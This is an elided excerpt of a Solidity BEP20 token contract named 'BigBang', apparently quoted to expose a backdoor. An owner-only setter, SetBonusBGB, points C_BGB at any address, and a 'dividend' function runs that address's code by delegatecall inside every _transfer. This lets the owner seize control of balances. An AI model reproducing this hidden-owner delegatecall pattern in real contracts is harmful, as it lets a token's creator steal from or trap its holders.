...
contract BigBang is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'BigBang';
  ...
  */
  ...
  function claimDividendBGB(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_BGB.delegatecall(
  ...
  function SetBonusBGB(address c) public onlyOwner {
    C_BGB = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendBGB(sender, recipient, amount);   
